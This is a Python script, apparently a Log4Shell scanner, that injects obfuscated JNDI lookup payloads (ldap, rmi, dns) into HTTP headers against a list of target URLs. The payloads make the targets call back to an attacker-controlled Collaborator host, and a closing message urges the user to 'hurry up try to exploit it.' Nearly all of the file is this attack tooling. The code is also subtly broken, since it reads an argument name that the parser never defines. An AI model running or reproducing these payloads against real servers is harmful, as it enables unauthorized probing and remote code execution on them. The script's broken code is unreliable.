"""
Albus Security
Author: Aniket Tyagi (Founder)
"""
import argparse
import sys
import time
from urllib3 import disable_warnings
import requests
from colorama import Fore

disable_warnings()

print(
    Fore.LIGHTRED_EX + "*****************************************************************************************************************")
print(Fore.RED + '\t\t\tLOH4SHELL VULNERABILITY SCANNER')
print("\t\t\tWELCOME TO ALBUS SECURITY".format(Fore.YELLOW))
print(Fore.GREEN + '\t\t\tAuthor: Aniket Tyagi')
print("Note:", Fore.RED + '\tI will improve this code again after completed penetration-list project')
print(
    Fore.LIGHTRED_EX + "*****************************************************************************************************************\n")

if len(sys.argv) > 1:
    pass
else:
    print('\n%s Please use -h for help.' % (sys.argv[0]))
    exit(0)

parser = argparse.ArgumentParser()
parser.add_argument('-U', '--Url', help='Provide Subdomain-list')
parser.add_argument('-B', '--Collaborator', help='Provide burpsuite collaborator')
parser.add_argument('-H', '--headers', help='Provide header-list default: headers.txt', default='headers.txt')
parser.add_argument('-t', '--timeout', help='Maximum number of seconds to wait while\
                                 requesting a web page (Default: 7)', default=10, type=int)

args = parser.parse_args()
filename = args.Url
burp = args.Burpcollab
hders = args.headers
timer = args.timeout


# Get data from file and make list from it
def DataGenerator(filename: object = "headers.txt") -> object:
    file_a = open(filename, 'r')
    data_list: list[str] = []
    [data_list.append(http_head.strip()) for http_head in file_a]
    return data_list


header_payload = DataGenerator(hders)
urls_list = DataGenerator(filename)

print(Fore.RED + "Please wait for second's we complete our process immediately")

time.sleep(3)

# Log4shell-payload
Log4shell_payload = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://" + str(burp) + "/a}",
                     "${${::-j}ndi:rmi://" + str(burp) + "/a}",
                     "${jndi:rmi://" + str(burp) + "}",
                     "${${lower:jndi}:${lower:rmi}://" + str(burp) + "/a}",
                     "${${lower:${lower:jndi}}:${lower:rmi}://" + str(burp) + "/a}",
                     "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://" + str(burp) + "/a}",
                     "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://" + str(burp) + "/a}",
                     "${jndi:dns://" + str(burp) + "/a}"]
url1: str
header = str

for url1 in urls_list:
    # it will take url one by one
    print(Fore.RED + "****************************************************************88")
    print(Fore.GREEN + "\t\tYour target--", url1)

    for Payloader in Log4shell_payload:
        # it will take log4shell_payload one by one
        for header in header_payload:
            # it will take header one by one
            print(Fore.RED + "\nPayload:-", Payloader)
            time.sleep(2)
            print(Fore.RED + 'Injecting.....')
            time.sleep(1)
            try:
                Requester = requests.get(url1, headers={header: Payloader}, timeout=timer)
                if Requester.status_code == 200:
                    print(Fore.GREEN + "\n\tPayload inject successfully")
                    print(Fore.RED + "*****************************************************************")
                else:
                    print(Fore.RED + "Sorry, You target give me Unexpected response\n let me try it with Another one ")
            except Exception as e:

                print(Fore.RED + "Make Sure your Target is visible:------", e)
                pass

''' Warning:- PLease wait for month I will again upload this code with more perfection'''
print(Fore.RED + "If you got dns ping in your collab Congratulations, then hurry up try to exploit it:---")
print(Fore.RED + 'Thank you for Using')
